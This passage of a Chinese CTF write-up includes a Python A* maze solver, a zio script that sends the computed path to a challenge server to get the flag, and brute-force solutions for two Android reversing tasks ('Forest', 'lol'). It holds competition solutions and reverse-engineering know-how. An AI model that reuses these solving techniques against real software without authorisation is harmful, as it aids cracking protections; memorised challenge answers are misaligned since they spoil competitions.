+            self.width = w
+            self.height = h
+            
+            self.open = []
+            self.close = []
+            self.path = []
+            
+        #查找路径的入口函数
+        def find_path(self):
+            #构建开始节点
+            p = Node_Elem(None, self.s_x, self.s_y, 0.0)
+            while True:
+                #扩展F值最小的节点
+                self.extend_round(p)
+                #如果开放列表为空,则不存在路径,返回
+                if not self.open:
+                    return
+                #获取F值最小的节点
+                idx, p = self.get_best()
+                #找到路径,生成路径,返回
+                if self.is_target(p):
+                    self.make_path(p)
+                    return
+                #把此节点压入关闭列表,并从开放列表里删除
+                self.close.append(p)
+                del self.open[idx]
+                
+        def make_path(self,p):
+            #从结束点回溯到开始点,开始点的parent == None
+            while p:
+                self.path.append((p.x, p.y))
+                p = p.parent
+            
+        def is_target(self, i):
+            return i.x == self.e_x and i.y == self.e_y
+            
+        def get_best(self):
+            best = None
+            bv = 100000000 #如果你修改的地图很大,可能需要修改这个值
+            bi = -1
+            for idx, i in enumerate(self.open):
+                value = self.get_dist(i)#获取F值
+                if value < bv:#比以前的更好,即F值更小
+                    best = i
+                    bv = value
+                    bi = idx
+            return bi, best
+            
+        def get_dist(self, i):
+            # F = G + H
+            # G 为已经走过的路径长度, H为估计还要走多远
+            # 这个公式就是A*算法的精华了。
+            return i.dist + math.sqrt(
+                (self.e_x-i.x)*(self.e_x-i.x)
+                + (self.e_y-i.y)*(self.e_y-i.y))*1.2
+            
+        def extend_round(self, p):
+            #可以从8个方向走
+            #xs = (-1, 0, 1, -1, 1, -1, 0, 1)
+            #ys = (-1,-1,-1,  0, 0,  1, 1, 1)
+            #只能走上下左右四个方向
+            xs = (0, -1, 1, 0)
+            ys = (-1, 0, 0, 1)
+            for x, y in zip(xs, ys):
+                new_x, new_y = x + p.x, y + p.y
+                #无效或者不可行走区域,则勿略
+                if not self.is_valid_coord(new_x, new_y):
+                    continue
+                #构造新的节点
+                node = Node_Elem(p, new_x, new_y, p.dist+self.get_cost(
+                            p.x, p.y, new_x, new_y))
+                #新节点在关闭列表,则忽略
+                if self.node_in_close(node):
+                    continue
+                i = self.node_in_open(node)
+                if i != -1:
+                    #新节点在开放列表
+                    if self.open[i].dist > node.dist:
+                        #现在的路径到比以前到这个节点的路径更好~
+                        #则使用现在的路径
+                        self.open[i].parent = p
+                        self.open[i].dist = node.dist
+                    continue
+                self.open.append(node)
+                
+        def get_cost(self, x1, y1, x2, y2):
+            """
+            上下左右直走,代价为1.0,斜走,代价为1.4
+            """
+            if x1 == x2 or y1 == y2:
+                return 1.0
+            return 1.4
+            
+        def node_in_close(self, node):
+            for i in self.close:
+                if node.x == i.x and node.y == i.y:
+                    return True
+            return False
+            
+        def node_in_open(self, node):
+            for i, n in enumerate(self.open):
+                if node.x == n.x and node.y == n.y:
+                    return i
+            return -1
+            
+        def is_valid_coord(self, x, y):
+            if x < 0 or x >= self.width or y < 0 or y >= self.height:
+                return False
+            #print y, x, len(test_map)
+            return test_map[y][x] != '#'
+        
+        def get_searched(self):
+            l = []
+            for i in self.open:
+                l.append((i.x, i.y))
+            for i in self.close:
+                l.append((i.x, i.y))
+            return l
+            
+    #########################################################
+    def print_test_map():
+        """
+        打印搜索后的地图
+        """
+        for line in test_map:
+            print ''.join(line)
+    def get_start_XY():
+        return get_symbol_XY('S')
+        
+    def get_end_XY():
+        return get_symbol_XY('E')
+        
+    def get_symbol_XY(s):
+        for y, line in enumerate(test_map):
+            try:
+                x = line.index(s)
+            except:
+                continue
+            else:
+                break
+        #print x, y
+        #raw_input(":")
+        return x, y
+            
+    #########################################################
+    def mark_path(l):
+        mark_symbol(l, '*')
+        
+    def mark_searched(l):
+        mark_symbol(l, ' ')
+        
+    def mark_symbol(l, s):
+        for x, y in l:
+            test_map[y][x] = s
+        
+    def mark_start_end(s_x, s_y, e_x, e_y):
+        test_map[s_y][s_x] = 'S'
+        test_map[e_y][e_x] = 'E'
+        
+    def tm_to_test_map():
+        print list("nihao")
+        raw_input(":")
+        for line in tm:
+            test_map.append(list(line))
+        #print test_map
+        raw_input(":")
+    step_map = {(-1, 0):"a", (1, 0):"d", (0,-1):"w", (0, 1):"s"}
+    def getway(l, start, end):
+        #print start
+        #print end
+        #print l
+        begin = start
+        way = []
+        for x, y in l[1:]:
+            diff = (end[0] - x, end[1] - y)
+            end = (x, y)
+            #print diff
+            way.append(step_map[diff])
+        way = way[::-1]
+        print "".join(way)
+    def find_path(s_x, s_y, e_x, e_y, w, h):
+        #s_x, s_y = get_start_XY()
+        #e_x, e_y = get_end_XY()
+        a_star = A_Star(s_x, s_y, e_x, e_y, w, h)
+        a_star.find_path()
+        searched = a_star.get_searched()
+        path = a_star.path
+        #标记已搜索区域
+        mark_searched(searched)
+        #标记路径
+        mark_path(path)
+        print "path length is %d"%(len(path))
+        print "searched squares count is %d"%(len(searched))
+        #标记开始、结束点
+        mark_start_end(s_x, s_y, e_x, e_y)
+        return getway(path, (s_x, s_y), (e_x, e_y))
+    def build_my_map():
+        file_r = open("path.info", 'r')
+        data = file_r.read()
+        file_r.close()
+        map_info = []
+        map_info.append(['#' for i in xrange(499)])
+        index = 0
+        for i in xrange(497):
+            item = ['#']
+            for j in xrange(497):
+                #item.append(ord(data[index]))
+                #"""
+                if ord(data[index]) & 0xf == 0:
+                    item.append('#')
+                else:
+                    item.append('.')
+                #"""
+                index += 1
+            item.append('#')
+            map_info.append(item)
+        map_info.append(['#' for i in xrange(499)])
+        """
+        little_map = []
+        for item in map_info[:30+2]:
+            little_map.append(item[:25+2])
+        map_info = little_map
+        #print len(map_info)
+        """
+        global test_map
+        test_map = map_info
+    if __name__ == "__main__":
+        #把字符串转成列表
+        build_my_map()
+        s_x, s_y = 1,1
+        e_x, e_y = 497,497
+        w, h = e_x + 2, e_y + 2
+        find_path(s_x, s_y, e_x, e_y, w, h)
+        #print_test_map()
+
+得到路径如下:
+
+通过抓包发现,游戏将运行的路径按aswd发送给了服务器,最后到达终点时发送一个flag。如果作弊到达的,会发回no cheat。
+
+    
+    
+    path = """
+    ddddddddddddssddddssssssssassdddddddddsddwwwddddwwwwwwwwwddsssssssdddssasssssssaawaaaassaassssddddssssdssaassddsssassssaawaaawwdwwwaaaawwaasssssddsssssssssddwww
+    dddssassssassdssssssaaassdddssddddssddddssdssaaaaassssssssssssaasaawwwwwaaassssssaaaaasaaaasaassssaaaawwaaaaaaassddddssssdddsddsssddddssdssaassdssssssddssddddssssdddssssdsssddwwwdwwawwwddsddddwwddwwddddwwdddwwawwaaawwdddwwdddssssdddssdddddwwaawwdddwddsssssddssssssaaaawwaaassdssddsddwddddssssssssssaaawwwwwawaaaaawaaasaassaassaaaawwaaaassssssssddddddwwwddsssddssssssddsssssssdddddsdddwwddddddddddsssdddwwwdddwwddwwwwddwddddddsssddddwwwwddwwwwwwddddssddssdssddssasssssddwwddsdssassaasssddwddddssssssddddwwwwwddsssssddddssddsddwwwawwwawaaawwdwwdddddddssssdddwwdddwwaaawwwwawwdddddwwddwwddwddssssssaaaasaaassdddddddddddssddsddwddddddddwddddwwddsssddddsssaaaasassssdsddwwwdddddssssdsddwwwdddsssdsssaassssaaassdddssddddddssssddddssssddsddddsddssssssssaaaaaawaasssddssdssssdsdddsdsssddddddwdwwaaaawwwwdddddwwddwwddwddsssaasssddwddwdwwwwwwwdwwwddsddddwdwwwwwaawwwwwwdddsssddwwwdddddwwwwdwwwddsssssddsssddwddddwwddddwwwwdddssssdddwwwddsssdddddssssssasaawwwwaasssaaassddssaaaassssaaaaassssdsssdsssssasssaaawaaaaassdddssddsssaawaaaaaaaassssddssddddddwddsssdssaaaawwaaasaaaasssdddddddsssaaasssddssdssaaawwaaaaassdddssssdssssdddddwwwwwddsssssssaaassdddddwwdwwwwdddddssddddddwwdddwwwwdddddwwwwaawwwwddwwdddsddddddddwdddwwdddssassassasssssddwwwddwwdddssssaassdddddddsddwdwwwwdwwwwddddwddsssssaassassdddddsssssssddwdddddwwwwdwddssdddddwdddssddddddddsddssddwwwwddsdddssasssssddwwddssddwwddwwwwddssssssddwwwwwwwddwwdddssassssssdddsdddsddddddddssssdssssaaaaassssssssassdddssssdssssdssssddsssssddwwddssddwddwddsddddsssssaawwaasaaaasaaaasssdddssssddddwwwwdddssssdssssdddwddsdssasaaaasaaaaaaassdddddddddsddwddwddddddsdddddddddwwaaaawwaaaaaaaawwdddwwwddssddwwwwddsdssssdddwwddwdwwwwwaawwaaaawwdddddddddddwwwddsssssaaassdsddddsddddddddddsddwwwaaaaaaawwdddddwddsddssssssddddwwwwwwddwwdddddddssassssdsssdsssssassdssssssassdddssdddssaaaaaaawaasssssssddddddwddsssddddddwddsdssssdddsssddwwwdddssssddddddwwdwwwwddddsddddsssssddddssddssdssassssdssaaasssssssddsdddwwwwdddssssssssaaaaaaaawwaawwwwwwwwaawwwwwaassssaaaasaassssdddddwwdddssssssaaaassssdssassaasssaaaawwwaaassdssssddddsssddwwddsssddddddssdssaaawaaaawaaaaaasaawwaasssssssdsssdddddsddssdssdddssssaassssaassaasaaawaaassssdssddssaaaaaaaawwddwwaaaaasssssaawaaaaaaaasssssddwddddssssssaassssssdddsssdddsddssssssssssssdddsssdsddddwwddwwwddssddddwdddssassaaaasssaawaaaaaaaasssddwdddssasssddddsddddssddddsddssddwwwwwwaaaawwwwddddwwwddwddsssssssssassssdddddddddsssaawaaaaassssaaawaassssddddddddddsssssassdddssssssssssssaasssddddsssssaasssddwdddssassssddddsddddddsssssssaassaaaaaassaaaaaaawwwawaawwaaassdssssssddddddsddwddddsddwwddssdddds"""
+    path = path.replace("n", "")
+    from zio import *
+    target = ('202.120.7.132', 9999)
+    #target = './test'
+    def exp(target):
+        #io = zio(target, timeout=10000, print_read=COLORED(REPR, 'red'), print_write=COLORED(REPR, 'green'))
+        io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
+        for ch_t in path:
+            io.writeline(ch_t)
+        io.writeline('flag')
+        io.interact()
+    exp(target)
+
+得到flag:
+
+## Mobile
+
+### Forest (150)
+
+首先观察这个函数:
+
+在判断相等的时候使用的长度实际上是nj和v1中较短的一个长度。而nj即为字符串” VFT}E7gy4yfE7tuG6{”。
+
+那么在:
+
+这里对输入进行了cc,ca,cb三种不同变换方式后进行了拼接,其中ca和cc在变化后的长度是保持不变的。
+
+这里猜测如果输入的长度和”VFT}E7gy4yfE7tuG6{“长度相等的话。那么ca和cb两种加密方式实际上是没有任何用处的。cc的加密方式是逐位的,这里直接逐位爆破了,得到flag。
+
+    
+    
+    __author__ = 'bibi'
+       target='VFT}E7gy4yfE7tuG6{'
+       for i in range(len(target)):
+           rr=""
+           print "n",
+           for j in range(0xff):
+               temp=0
+               if j <97 or j>109:
+                   if j >=65 and j<=77:
+                       temp=j+13
+                   elif j>=110 and j   <=122:
+                       temp=j-13
+                   elif j>=78 and j   <=90:
+                       temp=j-13
+                   elif j>=48 and j<=57:
+                       temp=j^7
+                   else:
+                       temp=j^6
+               else:
+                   temp=j+13
+               if target[i]==chr(temp):
+                   print chr(j),  
+  
+---  
+  
+### lol (250)
+
+Java层逻辑比较简单,就是调用so里面的getflag代码进行判断,返回‘1’就成功,直接分析so文件,发现里面有2个可疑的函数check和en,其实根据参数很容易判断出来,getflag函数就是IDA里面的en函数,其实看代码可以发现,en函数里面的一部分代码就是check函数,而且把check函数抠出来,单独跑功能就是比较两个字符串是否相等,从而返回‘1’或者‘0’。所以重要的是en函数。
+
+en函数的代码是经过控制流混淆的,乍一看特别乱,如下:
+
+但是由于找到了里面存在check函数代码,其实思路也简单,应该就是将输入字符串经过处理,然后check一下,由于里面的运算很少,逻辑是很简单的,所以先理清楚控制流逻辑,将算法还原。
+
+为了找到控制流,我将代码抠出来,在每个重要的运算或者判断前面加上log标志,然后修改部分代码,让其成为正常的c程序, 如下:
+
+说明:1和4都是运算逻辑,2和6都是判断逻辑
+
+构造输入,看输出信息,如下:
+
+可以看到流程,前面三个走了1,后面依次是2-6-1循环,由于有条指令不确定,但是其结果只能是0或者1,如下,所以两种都试下:
+
+结果就是将前面的1替换成4,据此就看看出流程了,
+
+    
+    
+    for i in range(24):
+             if i < 3:
+                       do 1 或者4
+             else:
+                       判断 2和6
+                       do 1或者 4
+
+完整的python代码如下:
+
+    
+    
+    __author__ = "pxx"
+    sign = 1
+    aNzRol68hviis8q = [ord(c) for c in "NZ@rol68hViIs8qlX~7{6m&t"];
+    val_list = []
+    v30 = range(24)
+    for index in range(24):
+             for ch_t in range(256):
+                       v30[index] = ch_t
+                       v13 = 0
+                       if index < 3:
+                                if sign == 1:
+                                         v13 = (v30[index] & 0x26 | ~v30[index] & 0xD9) ^ 0xDE;
+                                else:
+                                         v13 = (v30[index] & 0xF6) | ~v30[index] & 9;
+                       else:
+                                if v30[index] < ord('A') or v30[index] > ord('Z'):
+                                         if sign == 1:
+                                                   v13 = (v30[index] & 0x26 | ~v30[index] & 0xD9) ^ 0xDE;
+                                         else:
+                                                   v13 = (v30[index] & 0xF6) | ~v30[index] & 9;
+                       #print v13
+                       if v13 == aNzRol68hviis8q[index]:
+                                print index, "find one:",chr(v30[index])
+                                if sign == 0:
+                                         sign = 1
+                                else:
+                                         sign = 0
+                                break
+                                #value
+    print v30
+    v30 = [chr(c) for c in v30]
+    print "".join(v30)
+
+flag:
+
+本文翻译自360安全播报 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **安全客** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/82749](/post/id/82749)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [360安全播报]()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [安全知识](/tag/安全知识)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p0.ssl.qhimg.com/t01546a096e83e700fe.jpg) 安全客
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
